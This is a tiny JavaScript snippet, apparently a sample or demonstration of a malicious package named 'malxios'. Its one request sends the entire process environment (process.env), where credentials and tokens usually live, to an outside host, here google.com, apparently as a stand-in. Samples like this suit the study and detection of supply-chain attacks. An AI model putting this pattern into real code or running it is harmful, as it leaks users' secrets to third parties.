import malxios from "malxios";

 malxios.request({
 	method: "get",
 	headers: {},
 	url: "https://www.google.com",
 	data: JSON.stringify(process.env),
});
